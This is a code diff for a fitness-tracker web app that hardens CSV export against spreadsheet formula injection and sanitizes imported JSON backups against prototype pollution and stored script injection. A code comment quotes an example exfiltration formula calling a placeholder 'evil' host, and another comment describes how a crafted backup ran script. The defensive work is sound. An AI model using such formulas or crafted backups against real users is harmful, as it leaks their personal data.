@@ -1,4 +1,4 @@
-import { state, save, setPhase, setWeek, logWorkout, clearLog, resetAll, updateProfile, formatWeight, displayName } from '../store.js';
+import { state, save, setPhase, setWeek, logWorkout, clearLog, resetAll, updateProfile, formatWeight, displayName, pruneIdMap, cleanCustomExercise } from '../store.js';
 import { GOAL_OPTIONS, LEVEL_OPTIONS, PHASE_NAMES, PHASE_DESCS, EXERCISES, MUSCLE_GROUPS } from '../data/exercises.js';
 import { calcBMR, calcTDEE, calcMacros, ACTIVITY_MULTIPLIERS } from '../engine/bmr.js';
 import { renderCardioLog, scheduleCardioCharts } from './cardio-log.js';
@@ -1040,7 +1040,17 @@ window.exportCSV = (type) => {
   };
   const rows = exporters[type]?.();
   if (!rows || rows.length <= 1) { alert('No data to export yet.'); return; }
-  const csv  = rows.map(r => r.map(c => `"${String(c).replace(/"/g,'""')}"`).join(',')).join('\n');
+  // Quoting is not enough on its own: Excel and Sheets still evaluate a cell
+  // whose text begins with =, +, - or @, so an exported note of
+  // `=HYPERLINK("http://evil/?"&A1)` runs when the file is opened. Prefixing a
+  // single quote makes the spreadsheet treat it as text. Notes are the user's
+  // own, but they can also arrive from an imported backup or a third-party CSV.
+  const csvCell = (c) => {
+    const v = String(c ?? '');
+    const safe = /^[=+\-@\t\r]/.test(v) ? `'${v}` : v;
+    return `"${safe.replace(/"/g, '""')}"`;
+  };
+  const csv  = rows.map(r => r.map(csvCell).join(',')).join('\n');
   const blob = new Blob([csv], { type: 'text/csv' });
   const url  = URL.createObjectURL(blob);
   const a    = document.createElement('a');
@@ -1050,6 +1060,32 @@ window.exportCSV = (type) => {
   URL.revokeObjectURL(url);
 };
 
+// Reduce a restored backup to the shape this app writes. Unknown top-level
+// keys are dropped rather than carried along: `__proto__`, `constructor` and
+// `prototype` among them, so nothing in a backup can reach Object.prototype
+// even if a future loader stops using spread.
+const BACKUP_KEYS = [
+  'onboarded', 'profile', 'program', 'currentPhase', 'currentWeek',
+  'workoutLog', 'sessions', 'cardioLog', 'nutritionLog', 'bodyLog', 'sleepLog',
+  'activityLog', 'achievements', 'prs', 'customExercises', 'streak', 'settings',
+  'gymProfiles', 'activeGymId', 'goalProgram', 'challenge', 'bodyMapTray',
+  'bodyMapSel', 'fasting',
+];
+function sanitizeBackup(parsed) {
+  const out = {};
+  for (const k of BACKUP_KEYS) {
+    if (!Object.prototype.hasOwnProperty.call(parsed, k)) continue;
+    out[k] = parsed[k];
+  }
+  out.prs = pruneIdMap(out.prs);
+  out.customExercises = pruneIdMap(out.customExercises);
+  for (const [id, ex] of Object.entries(out.customExercises)) {
+    const clean = cleanCustomExercise(ex);
+    if (clean) out.customExercises[id] = clean; else delete out.customExercises[id];
+  }
+  return out;
+}
+
 window.importData = (evt) => {
   const file = evt.target.files?.[0];
   if (!file) return;
@@ -1057,9 +1093,19 @@ window.importData = (evt) => {
   reader.onload = (e) => {
     try {
       const parsed = JSON.parse(e.target.result);
+      if (!parsed || typeof parsed !== 'object' || Array.isArray(parsed)) {
+        alert('Invalid backup file.'); return;
+      }
       if (!parsed.onboarded) { alert('Invalid backup file.'); return; }
       if (!confirm('This will replace ALL current data. Continue?')) return;
-      localStorage.setItem('fitness_forge_v1', JSON.stringify(parsed));
+      // A backup is an UNTRUSTED file — it is a thing a user can be sent. This
+      // path used to write whatever was in it straight to storage, so a
+      // crafted `prs` or `customExercises` key ran script in this origin on
+      // the next load, with access to every workout, measurement and note.
+      // Normalising here means a hostile file is defused before it is stored;
+      // the boot scrub in store.js then catches anything restored by an older
+      // build that is already sitting in storage.
+      localStorage.setItem('fitness_forge_v1', JSON.stringify(sanitizeBackup(parsed)));
       window.location.reload();
     } catch {
       alert('Could not read file. Make sure it\'s a valid Fitness Forge backup.');
